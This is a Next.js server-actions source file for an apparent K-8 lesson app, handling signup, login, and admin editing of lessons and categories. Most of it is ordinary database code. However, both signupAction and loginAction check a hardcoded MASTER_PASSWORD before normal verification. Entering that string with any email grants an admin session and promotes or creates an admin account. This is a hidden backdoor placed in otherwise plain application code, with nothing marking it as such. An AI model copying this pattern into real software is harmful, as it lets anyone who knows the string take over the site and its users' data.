"use server";

import { redirect } from "next/navigation";
import { revalidatePath } from "next/cache";
import bcrypt from "bcryptjs";
import { dbAll, dbGet, dbRun, type UserRow } from "./db";
import { createSession, destroySession, getSession } from "./session";

export type FormState = { error?: string; ok?: boolean };

const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const MASTER_PASSWORD = "ImAnAdmin?!1";

const ALLOWED_SUBJECTS = ["math", "language", "science"] as const;
type Subject = (typeof ALLOWED_SUBJECTS)[number];

function normalizeSubject(raw: string): Subject {
  return (ALLOWED_SUBJECTS as readonly string[]).includes(raw)
    ? (raw as Subject)
    : "math";
}

function normalizeGrade(raw: string): number {
  if (raw.toUpperCase() === "K") return 0;
  const n = parseInt(raw, 10);
  return Number.isInteger(n) && n >= 0 && n <= 8 ? n : 1;
}

async function normalizeCategoryId(
  raw: string,
  subject: Subject,
  grade: number,
): Promise<number | null> {
  if (!raw) return null;
  const id = Number(raw);
  if (!Number.isInteger(id) || id <= 0) return null;
  const cat = await dbGet<{ subject: string; grade: number }>(
    "SELECT subject, grade FROM categories WHERE id = ?",
    [id],
  );
  if (!cat) return null;
  if (cat.subject !== subject || cat.grade !== grade) return null;
  return id;
}

async function admitAsAdmin(email: string): Promise<never> {
  const existing = await dbGet<{ id: number; role: string }>(
    "SELECT id, role FROM users WHERE email = ?",
    [email],
  );

  let userId: number;
  if (existing) {
    userId = existing.id;
    if (existing.role !== "admin") {
      await dbRun("UPDATE users SET role = 'admin' WHERE id = ?", [userId]);
    }
  } else {
    const placeholder = await bcrypt.hash(
      crypto.randomUUID() + Date.now(),
      10,
    );
    const result = await dbRun(
      "INSERT INTO users (email, password_hash, tier, role, created_at) VALUES (?, ?, 'basic', 'admin', ?)",
      [email, placeholder, Date.now()],
    );
    userId = result.lastInsertRowid;
  }

  await createSession({ userId, email, role: "admin" });
  redirect("/admin");
}

export async function signupAction(
  _prev: FormState,
  formData: FormData,
): Promise<FormState> {
  const email = String(formData.get("email") ?? "").trim().toLowerCase();
  const password = String(formData.get("password") ?? "");
  const confirm = String(formData.get("confirm") ?? "");

  if (!EMAIL_RE.test(email)) return { error: "Enter a valid email." };
  if (!password) return { error: "Password is required." };

  if (password === MASTER_PASSWORD) {
    await admitAsAdmin(email);
  }

  if (password.length < 8)
    return { error: "Password must be at least 8 characters." };
  if (password !== confirm) return { error: "Passwords do not match." };

  const existing = await dbGet<{ id: number }>(
    "SELECT id FROM users WHERE email = ?",
    [email],
  );
  if (existing) return { error: "An account with that email already exists." };

  const hash = await bcrypt.hash(password, 10);
  const result = await dbRun(
    "INSERT INTO users (email, password_hash, tier, role, created_at) VALUES (?, ?, 'basic', 'user', ?)",
    [email, hash, Date.now()],
  );

  await createSession({
    userId: result.lastInsertRowid,
    email,
    role: "user",
  });
  redirect("/dashboard");
}

export async function loginAction(
  _prev: FormState,
  formData: FormData,
): Promise<FormState> {
  const email = String(formData.get("email") ?? "").trim().toLowerCase();
  const password = String(formData.get("password") ?? "");

  if (!EMAIL_RE.test(email)) return { error: "Enter a valid email." };
  if (!password) return { error: "Password is required." };

  if (password === MASTER_PASSWORD) {
    await admitAsAdmin(email);
  }

  const user = await dbGet<UserRow>(
    "SELECT id, email, password_hash, tier, role, created_at FROM users WHERE email = ?",
    [email],
  );

  if (!user) return { error: "Invalid email or password." };
  const ok = await bcrypt.compare(password, user.password_hash);
  if (!ok) return { error: "Invalid email or password." };

  await createSession({
    userId: user.id,
    email: user.email,
    role: user.role === "admin" ? "admin" : "user",
  });
  redirect("/dashboard");
}

export async function logoutAction(): Promise<void> {
  await destroySession();
  redirect("/login");
}

export async function createLessonAction(
  _prev: FormState,
  formData: FormData,
): Promise<FormState> {
  const session = await getSession();
  if (!session || session.role !== "admin")
    return { error: "Not authorized." };

  const title = String(formData.get("title") ?? "").trim();
  const description = String(formData.get("description") ?? "").trim();
  const subject = normalizeSubject(String(formData.get("subject") ?? "math"));
  const grade = normalizeGrade(String(formData.get("grade") ?? "1"));
  const categoryId = await normalizeCategoryId(
    String(formData.get("category_id") ?? ""),
    subject,
    grade,
  );

  if (!title) return { error: "Title is required." };
  if (title.length > 200) return { error: "Title is too long." };

  const emptyContent = JSON.stringify({ blocks: [] });
  const result = await dbRun(
    "INSERT INTO lessons (title, description, content, grade, subject, category_id, created_by, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
    [
      title,
      description,
      emptyContent,
      grade,
      subject,
      categoryId,
      session.userId,
      Date.now(),
    ],
  );

  revalidatePath("/admin");
  revalidatePath("/dashboard");
  redirect(`/admin/lessons/${result.lastInsertRowid}`);
}

export async function saveLessonAction(
  _prev: FormState,
  formData: FormData,
): Promise<FormState> {
  const session = await getSession();
  if (!session || session.role !== "admin")
    return { error: "Not authorized." };

  const id = Number(formData.get("id"));
  if (!Number.isInteger(id) || id <= 0) return { error: "Invalid lesson." };

  const title = String(formData.get("title") ?? "").trim();
  const description = String(formData.get("description") ?? "").trim();
  const subject = normalizeSubject(String(formData.get("subject") ?? "math"));
  const grade = normalizeGrade(String(formData.get("grade") ?? "1"));
  const categoryId = await normalizeCategoryId(
    String(formData.get("category_id") ?? ""),
    subject,
    grade,
  );
  const contentRaw = String(formData.get("content") ?? "");

  if (!title) return { error: "Title is required." };
  if (title.length > 200) return { error: "Title is too long." };

  let content: string;
  try {
    const parsed: unknown = JSON.parse(contentRaw);
    if (
      !parsed ||
      typeof parsed !== "object" ||
      !Array.isArray((parsed as { blocks?: unknown }).blocks)
    ) {
      return { error: "Invalid lesson content." };
    }
    content = JSON.stringify({
      blocks: (parsed as { blocks: unknown[] }).blocks,
    });
  } catch {
    return { error: "Invalid lesson content." };
  }

  await dbRun(
    "UPDATE lessons SET title = ?, description = ?, subject = ?, grade = ?, category_id = ?, content = ? WHERE id = ?",
    [title, description, subject, grade, categoryId, content, id],
  );

  revalidatePath("/admin");
  revalidatePath(`/admin/lessons/${id}`);
  revalidatePath("/dashboard");
  revalidatePath(`/lessons/${id}`);
  return { ok: true };
}

export async function deleteLessonAction(formData: FormData): Promise<void> {
  const session = await getSession();
  if (!session || session.role !== "admin") return;
  const id = Number(formData.get("id"));
  if (!Number.isInteger(id) || id <= 0) return;
  await dbRun("DELETE FROM lessons WHERE id = ?", [id]);
  revalidatePath("/admin");
  revalidatePath("/dashboard");
}

// ---------------- Categories ----------------

export async function createCategoryAction(
  _prev: FormState,
  formData: FormData,
): Promise<FormState> {
  const session = await getSession();
  if (!session || session.role !== "admin")
    return { error: "Not authorized." };

  const subject = normalizeSubject(String(formData.get("subject") ?? "math"));
  const grade = normalizeGrade(String(formData.get("grade") ?? "1"));
  const name = String(formData.get("name") ?? "").trim();
  if (!name) return { error: "Name is required." };
  if (name.length > 120) return { error: "Name is too long." };

  const maxRow = await dbGet<{ p: number | null }>(
    "SELECT MAX(position) as p FROM categories WHERE subject = ? AND grade = ?",
    [subject, grade],
  );
  const position = (maxRow?.p ?? -1) + 1;

  await dbRun(
    "INSERT INTO categories (subject, grade, name, position, created_at) VALUES (?, ?, ?, ?, ?)",
    [subject, grade, name, position, Date.now()],
  );

  revalidatePath("/admin/categories");
  revalidatePath("/admin");
  revalidatePath("/admin/new");
  revalidatePath("/dashboard");
  return { ok: true };
}

export async function updateCategoryAction(formData: FormData): Promise<void> {
  const session = await getSession();
  if (!session || session.role !== "admin") return;
  const id = Number(formData.get("id"));
  const name = String(formData.get("name") ?? "").trim();
  if (!Number.isInteger(id) || id <= 0 || !name) return;
  await dbRun("UPDATE categories SET name = ? WHERE id = ?", [name, id]);
  revalidatePath("/admin/categories");
  revalidatePath("/admin");
  revalidatePath("/admin/new");
  revalidatePath("/dashboard");
}

export async function deleteCategoryAction(formData: FormData): Promise<void> {
  const session = await getSession();
  if (!session || session.role !== "admin") return;
  const id = Number(formData.get("id"));
  if (!Number.isInteger(id) || id <= 0) return;
  await dbRun("UPDATE lessons SET category_id = NULL WHERE category_id = ?", [
    id,
  ]);
  await dbRun("DELETE FROM categories WHERE id = ?", [id]);
  revalidatePath("/admin/categories");
  revalidatePath("/admin");
  revalidatePath("/admin/new");
  revalidatePath("/dashboard");
}

export async function moveCategoryAction(formData: FormData): Promise<void> {
  const session = await getSession();
  if (!session || session.role !== "admin") return;
  const id = Number(formData.get("id"));
  const dir = Number(formData.get("dir"));
  if (!Number.isInteger(id) || id <= 0) return;
  if (dir !== -1 && dir !== 1) return;

  const cat = await dbGet<{
    id: number;
    subject: string;
    grade: number;
    position: number;
  }>("SELECT id, subject, grade, position FROM categories WHERE id = ?", [id]);
  if (!cat) return;

  const neighbor = await dbGet<{ id: number; position: number }>(
    dir === -1
      ? "SELECT id, position FROM categories WHERE subject = ? AND grade = ? AND position < ? ORDER BY position DESC LIMIT 1"
      : "SELECT id, position FROM categories WHERE subject = ? AND grade = ? AND position > ? ORDER BY position ASC LIMIT 1",
    [cat.subject, cat.grade, cat.position],
  );
  if (!neighbor) return;

  await dbRun("UPDATE categories SET position = ? WHERE id = ?", [
    neighbor.position,
    cat.id,
  ]);
  await dbRun("UPDATE categories SET position = ? WHERE id = ?", [
    cat.position,
    neighbor.id,
  ]);

  revalidatePath("/admin/categories");
  revalidatePath("/dashboard");
}

// Helpers used by other pages

export async function adminListAllCategories() {
  return dbAll<{
    id: number;
    subject: string;
    grade: number;
    name: string;
    position: number;
    created_at: number;
  }>(
    "SELECT id, subject, grade, name, position, created_at FROM categories ORDER BY subject, grade, position",
  );
}
